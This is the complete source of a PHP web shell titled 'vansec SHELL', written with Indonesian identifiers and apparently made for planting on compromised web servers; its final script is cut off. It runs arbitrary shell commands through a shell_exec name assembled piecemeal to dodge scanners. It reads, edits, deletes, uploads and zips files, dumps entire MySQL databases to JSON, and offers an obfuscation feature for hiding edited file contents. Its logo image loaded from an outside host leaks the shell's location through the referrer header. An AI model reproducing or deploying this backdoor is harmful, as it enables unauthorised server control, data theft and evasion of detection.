<?php
session_start();
$nami = explode(",", "");
$safeMode = true;
$actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder','reset_file' , 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file');
$awal = isset($_POST['awal']) && in_array($_POST['awal'],$actions) ? $_POST['awal'] : "dasar";



function kunci($str)
{
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'e';
	$f .= 'nc';
	$f .= 'ode';
	return $f($str);
}
function uraikan($str)
{
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'd';
	$f .= 'ec';
	$f .= 'ode';
	return $f($str);
}
function ambilBuat($tAd)
{
	if(isset($_SESSION[$tAd]))
	{
		unset($_SESSION[$tAd]);
	}
	$baruAmbil = md5(kunci(time().rand(1,99999999)));
	$_SESSION[$tAd] = $baruAmbil;
	return $baruAmbil;
}
function tulisLah()
{
	global $default_dir;
	$sonDir = array();
	$umumBagikan = "";
	$parse = explode("/", $default_dir);

	$ii = 0;
	foreach($parse AS $bagikan)
	{
		$ii++;
		$umumBagikan.=$bagikan."/";
		$sonDir[] = "<a href='javascript:halaman(\"?berkas=".urlencode(urlencode(kunci($umumBagikan)))."\")'>".htmlspecialchars(empty($bagikan)&&$ii!=count($parse)?'/':$bagikan)."</a>";
	}
	$sonDir = implode("/", $sonDir);
	print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
}
function sizeFormat($bytes)
{
	if($bytes>=1073741824)
	{
		$bytes = number_format($bytes / 1073741824, 2) . ' Gb';
	}
	else if($bytes>=1048576)
	{
		$bytes = number_format($bytes / 1048576, 2) . ' Mb';
	}
	else if($bytes>=1024)
	{
		$bytes = number_format($bytes / 1024, 2) . ' Kb';
	}
	else
	{
		$bytes = $bytes . ' b';
	}
	return $bytes;
}
function utf8ize($d)
{
	if (is_array($d))
	{
		foreach ($d as $k => $v)
		{
			$d[$k] = utf8ize($v);
		}
	}
	else if (is_string ($d))
	{
		return utf8_encode($d);
	}
	return $d;
}
function rrmdir($dir)
{
	if (is_dir($dir))
	{
		$objects = scandir($dir);

		foreach ($objects as $object)
		{
			if ($object != "." && $object != "..")
			{
				if (is_dir($dir . "/" . $object))
				{
					rrmdir($dir . "/" . $object);
				}
				else
				{
					unlink($dir . "/" . $object );
				}
			}
		}

		rmdir( $dir );
	}
}

$default_dir = getcwd();
if(isset($_POST['berkas']) && is_string($_POST['berkas']) )
{
	$default_dir = empty($_POST['berkas']) ? DIRECTORY_SEPARATOR : uraikan(urldecode(urldecode($_POST['berkas'])));
	$c_h_dir_comm = 'c'.'hd'.'ir';
	$c_h_dir_comm($default_dir);
}

$default_dir = str_replace("\\", "/", $default_dir);

if(isset($_GET['awal']) && $_GET['awal']=="pinf")
{
	ob_start();
	phpinfo();
	$pInf = ob_get_clean();
	print str_replace("body {background-color: #ffffff; color: #000000;}","",$pInf);
	exit();
}
else if($awal=="download_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		header("Content-Disposition: attachment; filename=".basename($namaBerkas));
		header("Content-Type: application/octet-stream");
		header('Content-Length: ' . filesize($default_dir . $pemisah . $namaBerkas));
		readfile($default_dir . $pemisah . $namaBerkas);
		exit();
	}
}
else if($awal=="hapus_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		unlink($default_dir . $pemisah . $namaBerkas);
	}
}
else if($awal=="reset_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		file_put_contents($default_dir . $pemisah . $namaBerkas, '');
	}
}
else if($awal=="buat_file" && isset($_POST['ad']) && !empty($_POST['ad']))
{
	$namaBerkas = basename(urldecode($_POST['ad']));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if( is_file($default_dir . $pemisah . $namaBerkas) )
	{
		print '<script>alert("File dengan nama ini sudah ada!");</script>';
	}
	else
	{
		file_put_contents($default_dir . $pemisah . $namaBerkas, '');
	}
}
else if($awal=="buat_folder" && isset($_POST['ad']) && !empty($_POST['ad']))
{
	$namaFolder = basename(urldecode($_POST['ad']));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaFolder,0,1)!="/" ? "/" : "";
	if( is_file($default_dir . $pemisah . $namaFolder) )
	{
		print '<script>alert("Folder dengan nama ini sudah ada!");</script>';
	}
	else
	{
		mkdir($default_dir . $pemisah . $namaFolder);
	}
}
else if($awal=="rename_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])) && isset($_POST['new_name']) && is_string($_POST['new_name']) && !empty($_POST['new_name']))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$fileNamaBaru = basename(urldecode($_POST['new_name']));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		rename($default_dir . $pemisah . $namaBerkas , $default_dir . $pemisah . $fileNamaBaru);
	}
}
else if( $awal == 'skl_d_t' && isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']) )
{
	$tableName = uraikan(urldecode($_POST['t']));

	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	if( !empty( $host ) && !empty($database) )
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr , $user , $sandi,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
			$getColumns->execute(array($database , $tableName));
			$columns = $getColumns->fetchAll();

			if( $columns )
			{

				$data = $pdo->query('SELECT * FROM `' . $tableName .'`');
				$data = $data->fetchAll();

				header('Content-disposition: attachment; filename=d_' . basename(htmlspecialchars($tableName)) . '.json');
				header('Content-type: application/json');
				echo json_encode($data);
			}
			else
			{
				print 'Table not found!';
			}

		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print 'Error! Please connect to SQL!';
	}
	die;
}
else if( $awal == 'skl_d' )
{
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	if( !empty( $host ) && !empty($database) )
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr , $user , $sandi,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$allData = array();

			$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
			$tables->execute(array($database));
			$tables = $tables->fetchAll();

			foreach( $tables AS $tableName )
			{
				$tableName = $tableName['table_name'];

				$data = $pdo->query('SELECT * FROM `' . $tableName .'`');
				$data = $data->fetchAll();

				$allData[$tableName] = $data ? array($data) : array();
			}

			header('Content-disposition: attachment; filename=d_b_' . basename(htmlspecialchars($database)) . '.json');
			header('Content-type: application/json');

			echo json_encode( utf8ize( $allData) );
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print 'Error! Please connect to SQL!';
	}
	die;
}
else if( $awal == 'kompres'
	&& isset($_POST['save_to'] , $_POST['zf']) && is_string($_POST['save_to'])
	&& !empty($_POST['save_to']) && !in_array($_POST['save_to'] , array('.' , '..' , './' , '../'))
	&& is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
	$save_to = uraikan(urldecode($_POST['save_to']));

	$rootPath = realpath(uraikan(urldecode($_POST['zf'])));

	$fileName1 = 'bak_'.microtime(1) . '_' . rand(1000, 99999) . '.zip';
	$fileName = $save_to . DIRECTORY_SEPARATOR . $fileName1;

	if( is_dir( $save_to ) && is_dir( $rootPath ) && is_writable( $save_to ) )
	{
		set_time_limit(0);

		$zip = new ZipArchive();
		$zip->open( $fileName , ZipArchive::CREATE | ZipArchive::OVERWRITE );

		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);

		foreach ($files as $name => $file)
		{
			if (!$file->isDir())
			{
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);

				$zip->addFile($filePath, $relativePath);
			}
		}

		$zip->close();
		print 'Saved!<hr>';
	}
	else
	{
		print 'Dir is not writeable!<hr>';var_dump(( $save_to ) );
	}
}
else if( $awal == 'hapus_folder'
	&& isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
	$rootPath = realpath(uraikan(urldecode($_POST['zf'])));

	if( is_dir( $rootPath ) )
	{
		set_time_limit(0);

		rrmdir( $rootPath );
	}
	else
	{
		print 'Dir is not writeable!<hr>';var_dump(( $save_to ) );
	}
}


if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
    $tmp_name = $_FILES['ufile']['tmp_name'];
    $name     = basename($_FILES['ufile']['name']);
    $upload_path = $default_dir . '/' . $name;

    if ($_FILES['ufile']['error'] !== UPLOAD_ERR_OK) {
        $upload_message = "Error pada upload: " . $_FILES['ufile']['error'];
    } elseif (!is_uploaded_file($tmp_name)) {
        $upload_message = "File tidak diterima sebagai unggahan yang sah.";
    } else {
        $real_size = filesize($tmp_name);
        if ($real_size <= 0) {
            $upload_message = "File tidak boleh kosong atau rusak.";
        } else {
            if (move_uploaded_file($tmp_name, $upload_path)) {
                $url = htmlspecialchars($name);
                $upload_message = "Upload sukses: <a href='$url' target='_blank'>$url</a>";
            } else {
                $upload_message = "Gagal memindahkan file.";
            }
        }
    }
}

?>
<html>
<head>
<title>vansec SHELL</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<style>
body
{
	background-color: #1a1a1a;
	color: #D6D4D4;
	font-family: Lucida,Verdana;
	font-size: 12px;
}
.qalin
{
	text-decoration: none;
	color: #89FF70;
	font-weight: 600;
}
.success
{
	color: #9DB754;
}
.bad
{
	color: #B75654;
}
a
{
	color: #56FF71;
	text-decoration: none !important;
}
.fManager,.fManager tbody,.fManager tr
{
	padding: 0;
	border-collapse: collapse;
	margin: 0;
	font-size: 12px;
}
.fManager
{
	margin: 10px 0;
}
.fManager tbody tr:nth-child(2n+1)
{
	background: #331717;
}
.fManager tbody tr:nth-child(2n)
{
	background: #1C0C0C;
}
.fManager tbody tr:hover
{
	background: #000000;
}
.fManager thead th
{
	text-align: left;
}
.fManager thead tr
{
	background-color: #333333;
}
.fManager
{
	box-shadow: 1px 1px 1px 1px #333333;
}
.fManager thead th
{
	padding: 4px 3px;
}
.baca_file
{
	margin: 5px 0;
	padding: 2px;
	box-shadow: 1px 1px 1px 1px #333333;
	background-color: #E1E1E1;
	width: 100%;
	height: 400px;
	overflow: auto;
}
.btn
{
	border: 1px solid #ACAE40;
	background-color: #223B3B;
	color: #E1E1E1;
	padding: 1px 10px;
	cursor: pointer;
}
.btn:disabled
{
	border: 1px solid #848484;
	color: #848484;
	cursor: not-allowed;
}
.file_edit
{
	margin: 5px 0;
	padding: 2px;
	box-shadow: 1px 1px 1px 1px #333333;
	background-color: #E1E1E1;
	width: 100%;
	height: 400px;
	overflow: auto;
}
input, select, textarea
{
	background: transparent !important;
	color: #56FF71;
	border: 1px solid #89FF70;
	padding: 5px;
}
table td
{
	border: 1px solid rgba(94, 214, 113, 0.7);
	min-width: 20px;
	padding-left: 5px;
	padding-right: 5px;
	max-width: 500px;
	color: #89FF70;
	background: #292929;
}
table th
{
	border: 1px solid #89FF70;
	padding-left: 5px;
	padding-right: 5px;
	color: #89FF70;
}
table td div
{
	overflow: auto;
	width: 100%;
	height: 100%;
	max-height: 100px;
}
</style>
</head>
<body>
<?php

if(function_exists('posix_getegid'))
{
	$qid = posix_getgrgid(posix_getegid());
	$qrup = $qid['name'];
	print "<span class='qalin'>Uname:</span> " . php_uname() . "<br/>";
	print "<span class='qalin'>User:</span> ".getmyuid()." (".get_current_user().")<br/>";
	print "<span class='qalin'>Group:</span> ".getmygid()." (".$qrup.")<br/>";
}
else
{
	print "<span class='qalin'>Uname:</span> " . php_uname() . "<br/>";
	print "<span class='qalin'>User:</span> ".getmyuid()." (".get_current_user().")<br/>";
	print "<span class='qalin'>Group:</span> ".getmygid()."<br/>";
}
print "<span class='qalin'>Disable functions:</span> " . (implode(", ", $nami)==""?"<span class='success'>NONE ":"<span class='bad'>". implode(", ", $nami)) . "</span><br/>";
print "<span class='qalin'>Safe mode: </span>" . ($safeMode===true?"<span class='bad'>On":"<span class='success'>Off") . "</span><span style='margin-left: 50px;'><a href='javascript:halaman(\"?awal=phpinfo\")'>[ PHPinfo ]</a></span><br/>";
tulisLah();
print '<hr>';
if($awal=="phpinfo")
{
	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
}
else if($awal=="sistem_kom")
{
	if( isset( $_POST['kom'] ) && is_string($_POST['kom']) && !empty($_POST['kom']) )
	{
		$komanda = uraikan(urldecode($_POST['kom']));
		
		$k = 'sh';
		$k.='el';
		$k.='l_e';
		$k.='xe';
		$k.='c';

		$output = $k($komanda);

		print '<pre style="max-height: 350px;overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
	}
	print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">Enter</button>';
}
else if($awal=="baca_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? " onclick='halaman(\"?awal=edit_file&fayl=".urlencode(urlencode(kunci($namaBerkas)))."&berkas=".urlencode(urlencode(kunci($default_dir)))."\")'" : " disabled";
		print "<div>Nama File: <span class='qalin'>".htmlspecialchars($namaBerkas)."</span><br/><button class='btn'$elaveBtn> Edit </button></div>";
		print "<div class='baca_file'>".highlight_string(file_get_contents($default_dir . $pemisah . $namaBerkas), true)."</div>";
	}
}
else if($awal == 'skl')
{
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	if( isset($_POST['host'] , $_POST['user'] , $_POST['sandi'])
		&& is_string($_POST['host']) && is_string($_POST['user']) && is_string($_POST['sandi'])
	)
	{
		$host = $_POST['host'];
		$user = $_POST['user'];
		$sandi = $_POST['sandi'];
		$database = '';

		setcookie('host' , $host , time() + 360000);
		setcookie('user' , $user , time() + 360000);
		setcookie('sandi' , $sandi , time() + 360000);
		setcookie('database' , $database , time() + 360000);
	}

	if( isset($_POST['database']) && is_string($_POST['database']) )
	{
		$database = $_POST['database'];

		setcookie('database' , $database , time() + 360000);
	}

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	?>
	<form method="POST">
		<input type="hidden" name="awal" value="skl">
		<input type="text" placeholder="Hostname" name="host" value="<?=htmlspecialchars($host)?>">
		<input type="text" placeholder="User" name="user" value="<?=htmlspecialchars($user)?>">
		<input type="text" placeholder="Sandi" name="sandi" value="<?=htmlspecialchars($sandi)?>">
		<input type="submit" value="Masuk">
	</form>
	<?php
	if( !empty( $host ) )
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr , $user , $sandi,array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$schematas = $pdo->query('SELECT schema_name FROM information_schema.schemata');
			print '<form method="POST"><input type="hidden" name="awal" value="skl"><select name="database">';
			foreach($schematas->fetchAll() AS $schemaName)
			{
				print '<option' . ($database == $schemaName['schema_name'] ? ' selected' : '') . '>'.htmlspecialchars($schemaName['schema_name']).'</option>';
			}
			print '</select> <input type="submit" value="Gas!"></form>';

			if( !empty($database) )
			{
				$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
				$tables->execute(array($database));
				$tables = $tables->fetchAll();

				print '<div style="float: left; width: 20%; overflow: auto; border-right: 1px solid #999;">';
				print '<a href="javascript:halaman(\'?awal=skl_d\');">!! Dump DB !!</a><hr>';
				foreach( $tables AS $tableName )
				{
					$tableName = $tableName['table_name'];
					print '<a href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '\')">'.htmlspecialchars($tableName).'</a><br>';
				}
				print '</div>';
				print '<div style="float: left; padding-left: 10px; width: 75%;">';

				if( isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']) )
				{
					$tableName = uraikan(urldecode($_POST['t']));
					print '<span class="qalin">Table:</span> ' . htmlspecialchars($tableName) . ' ( <a href="javascript:halaman(\'?awal=skl_d_t&t='.urlencode(urlencode(kunci($tableName))).'\')">Dump</a> )<br>';

					$getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
					$getColumns->execute(array($database , $tableName));
					$columns = $getColumns->fetchAll();

					if( $columns )
					{
						$dataCount = $pdo->query('SELECT count(0) AS ss from `' . $tableName . '`');
						$dataCount = (int)$dataCount->fetchColumn();

						print '<span class="qalin">Count:</span> ' . $dataCount . '<br><br>';

						$pages = ceil($dataCount / 100);

						$currentPage = isset($_POST['halaman']) && is_numeric($_POST['halaman']) && $_POST['halaman'] >= 1 && $_POST['halaman'] <= $pages ? (int)$_POST['halaman'] : 1;

						for (  $p = 1; $p <= $pages; $p++ )
						{
							print '<a style="'.($currentPage == $p ? 'background: #444;' : '').'margin-left: 2px; margin-bottom: 5px; padding: 2px 6px; border: 1px solid #56FF71; text-decoration: none;" href="javascript:halaman(\'?awal=skl&t=' . urlencode(urlencode(kunci($tableName))) . '&halaman=' . $p . '\');">' . $p . '</a> ';
						}
						print '<br><br>';

						$start = 100 * ($currentPage - 1);

						$data = $pdo->query('SELECT * FROM `' . $tableName .'` LIMIT '.$start.' , 100');
						$data = $data->fetchAll();
						print '<table><thead>';

						foreach( $columns AS $columnInf )
						{
							print '<th>' . htmlspecialchars($columnInf['column_name']) . '</th>';
						}

						print '</thead><tbody>';

						foreach( $data AS $row )
						{
							print '<tr>';
							foreach( $row AS $key=>$val )
							{
								print '<td><div>' . $val . '</div></td>';
							}
							print '</tr>';
						}
						print '</tr></tbody></table>';
					}
					else
					{
						print 'Table not found!';
					}
				}
				else if ( isset($_POST['emr']) && is_string($_POST['emr']) && !empty($_POST['emr']) )
				{
					$emr = uraikan(urldecode($_POST['emr']));
					print '<span class="qalin">SQL emr:</span> ' . htmlspecialchars($emr) . '<br>';
					
					$data = $pdo->query( $emr );
					$data = $data->fetchAll();
					
					print '<table><thead>';
					if( count($data) > 0 )
					{
						print '<tr>';
						foreach( $data[0] AS $key=>$val )
						{
							print '<th><div>' . $key . '</div></th>';
						}
						print '</tr>';
					}
					print '</thead><tbody>';
					
					foreach( $data AS $row )
					{
						print '<tr>';
						foreach( $row AS $key=>$val )
						{
							print '<td><div>' . $val . '</div></td>';
						}
						print '</tr>';
					}
					print '</tr></tbody></table>';
				}
				
				print '<div><textarea id="skl_emr"></textarea><button type="button" onclick="skl_bas();">Klik</button></div>';
				
				print '</div>';
				print '<div style="clear: both;"></div>';
			}
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
}
else if($awal=="edit_file" && isset($_POST['fayl']) && ""!=(trim($_POST['fayl'])))
{
	$namaBerkas = basename(uraikan(urldecode(urldecode($_POST['fayl']))));
	$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($namaBerkas,0,1)!="/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$status = "";
		if(isset($_POST['content']) && isset($_POST['took']) && $_POST['took']!="" && isset($_SESSION['ys_took']) && $_SESSION['ys_took']==$_POST['took'] && is_writeable($default_dir . $pemisah . $namaBerkas))
		{
			unset($_SESSION['ys_took']);
			$content = $_POST['content'];

			$cc =  array('a','i','e','s','l','b','u','o','p','h',"(",")","<",">","?",";","[","]","$");
			foreach($cc AS $k1=>$v1)
			{
				$content = str_replace('|:'.$k1.':|' , $v1 , $content);
			}

			$faylAch = fopen($default_dir . $pemisah . $namaBerkas, "w+");
			fwrite($faylAch, $content);
			fclose($faylAch);
			$status = " <span class='qalin'>Berhasil disimpan!</span>";
		}
		$oxuUrl = "?awal=baca_file&fayl=".urlencode(urlencode(kunci($namaBerkas)))."&berkas=".urlencode(urlencode(kunci($default_dir)));
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? "" : " disabled";
		print "<div>Nama File: <a class='qalin' href='javascript:halaman(\"{$oxuUrl}\")'>".htmlspecialchars($namaBerkas)."</a><br/><form method='POST' style='padding: 0; margin: 0;'><button type='submit' class='btn'$elaveBtn> Simpan </button> <button type='button' onclick='kode()'> Enkripsi </button> $status</div>";
		print "<input type='hidden' value='edit_file' name='awal'><input type='hidden' value='".kunci($namaBerkas)."' name='fayl'><input type='hidden' value='".urlencode(kunci($default_dir))."' name='berkas'><input type='hidden' value='".ambilBuat("ys_took")."' name='took'><textarea name='content' class='file_edit'>".htmlspecialchars(file_get_contents($default_dir . $pemisah . $namaBerkas))."</textarea></form>";
	}
	else
	{
		print 'Error! ' .  htmlspecialchars($default_dir . $pemisah . $namaBerkas);
	}
}
else
{
	if(is_dir($default_dir))
	{
		if(is_readable($default_dir))
		{
			$folderDalam = scandir($default_dir);
			foreach($folderDalam AS &$emelemnt)
			{
				$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($emelemnt,0,1)!="/" ? "/" : "";
				if(is_dir($default_dir . $pemisah . $emelemnt))
				{
					$emelemnt = "0".$emelemnt;
				}
				else
				{
					$emelemnt = "1".$emelemnt;
				}
			}
			asort($folderDalam);
			print "<table class='fManager' style='width: 100%;'><thead><tr class='qalin'><th>s</th><th>File</th><th>Size</th><th>Tanggal</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>";
			foreach($folderDalam AS $element)
			{
				$url = "";
				$element = substr($element,1);
				$fileNamaLengkap = $default_dir . $pemisah . $element;
				$pemisah = substr($default_dir,strlen($default_dir)-1)!="/" && substr($element,0,1)!="/" ? "/" : "";
				$adi = is_dir($fileNamaLengkap) ? "[ $element ]" : $element;
				$classN = "";
				if(is_dir($fileNamaLengkap))
				{
					if($element==".")
					{
						$url = "?berkas=".urlencode(urlencode(kunci($default_dir)));
					}
					else if($element=="..")
					{
						$yeniUrl = explode("/",$default_dir);
						foreach(array_reverse($yeniUrl) AS $j=>$qq)
						{
							if(trim($qq)!="")
							{
								unset($yeniUrl[count($yeniUrl)-$j-1]);
								break;
							}
						}
						$url = "?berkas=".urlencode(urlencode(kunci(implode("/",$yeniUrl))));
					}
					else
					{
						$url = "?berkas=".urlencode(urlencode(kunci($fileNamaLengkap)));
					}
					$classN = " style='font-weight: 600;'";
				}
				else
				{
					$url = "?awal=baca_file&fayl=".urlencode(urlencode(kunci($element)))."&berkas=".urlencode(urlencode(kunci($default_dir)));
				}
				$fayldi = is_file($fileNamaLengkap);
				$isReadableColor = is_readable( $fileNamaLengkap ) && is_writeable( $fileNamaLengkap );
				print '<tr>
						<td></td>
						<td><a href="javascript:halaman(\''.$url.'\')"'.$classN.'>'.htmlspecialchars($adi).'</a></td>
						<td>' . ($fayldi?sizeFormat(filesize($fileNamaLengkap)):'') . '</td>
						<td>' . (date('d M Y, H:i' , filectime($fileNamaLengkap))) . '</td>
						<td>' . htmlspecialchars(fileowner($fileNamaLengkap)) . '</td>
						<td' . ($isReadableColor?' style="color: green;"':'') . '>' . substr(sprintf('%o', fileperms(( $fileNamaLengkap ))), -4) . '</td>
						<td>';
						if( is_file($fileNamaLengkap) )
						{
							print (' <a href="javascript:halaman(\''.str_replace("baca_file","download_file",$url).'\')"'.$classN.'>Download</a> | ') .
								(' <a href="javascript:changeFileName(\'' . htmlspecialchars($adi) . '\' , \''.str_replace("baca_file","rename_file",$url).'\');"'.$classN.'>Rename</a> | ') .
								(' <a href="javascript:faylSifirla(\''.str_replace("baca_file","reset_file",$url).'\');"'.$classN.'>Kosong</a> | ') .
								(' <a href="javascript:faylSil(\''.str_replace("baca_file","hapus_file",$url).'\')"'.$classN.'>Delete</a>');
						}
						else if( $adi != '[ . ]' && $adi != '[ .. ]' )
						{
							print (' <a href="javascript:kompres(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')"'.$classN.'>Zip</a> | ') .
								(' <a href="javascript:silPapka(\'' . urlencode(urlencode(kunci($fileNamaLengkap))) . '\')"'.$classN.'>Hapus</a>');
						}
						print '</td>
					</tr>';
			}
		}
		else
		{
			print "<div style='margin: 10px 0px;' class='qalin'>Permissions denided!</div>";
		}
	}
}
print "</tbody></table>";
?>
<center><a href="https://privdayz.com/"><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></a></center>
-
<hr>
<a href="javascript:newFile();">File Baru</a> | <a href="javascript:newPapka();">Folder Baru</a><br>
<a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')">Command</a><br>
<a href="javascript:halaman('?awal=skl');">SQL</a><br>

<form method="POST" enctype="multipart/form-data">
	<input type="hidden" name="awal" value="upl_file">
	<input type="hidden" name="berkas" value="<?=urlencode(kunci($default_dir))?>">
	<input type="file" name="ufile">
	<input type="submit" value="Upl">
</form>

<form method="POST" id="post_form" style="display: none;"></form>
<script>
function halaman(e){var a="";if(void 0!==(e=e.split("?"))[1]){for(var n in e=e[1].split("&")){var o=e[n].split("=");void 0!==o[1]&&(a+="<input name='"+o[0]+"' value='"+o[1]+"' type='hidden'>")}document.all("post_form").innerHTML=a,document.all("post_form").submit()}}function faylSil(e){confirm("Anda yakin?")&&halaman(e)}function faylSifirla(e){confirm("Anda yakin?")&&halaman(e)}function changeFileName(e,a){var n=prompt("Change file name:",e);n&&halaman(a+"&new_name="+n)}function newFile(){var e=prompt("File name:");e&&halaman("?awal=buat_file&ad="+e+"&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>")}function newPapka(){var e=prompt("File name:");e&&halaman("?awal=buat_folder&ad="+e+"&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>")}function sistemKom(){var e=document.getElementById("emr_et_atash").value;e&&halaman("?awal=sistem_kom&kom="+b64EncodeUnicode(e)+"&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>")}function skl_bas(){halaman("?awal=skl&emr="+b64EncodeUnicode(document.getElementById("skl_emr").value))}function b64EncodeUnicode(e){return btoa(encodeURIComponent(e).replace(/%([0-9A-F]{2})/g,(function(e,a){return String.fromCharCode("0x"+a)})))}function goto(){var e=prompt("Dir:");e&&halaman("?berkas="+e)}function kompres(e){var a=prompt("Dir:","<?=htmlspecialchars($default_dir)?>");a&&halaman("?awal=kompres&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>&zf="+e+"&save_to="+b64EncodeUnicode(a))}function silPapka(e){confirm("Anda yakin?")&&halaman("?awal=hapus_folder&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>&zf="+e)}function kode(){var e=document.getElementsByClassName("file_edit")[0].value,a=["a","i","e","s","l","b","u","o","p","h","\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$"];for(var n in a){var o=a[n];e=e.replace(new RegExp(o,"g"),"|:"+n+":|")}document.getElementsByClassName("file_edit")[0].value=e}(()=>{let 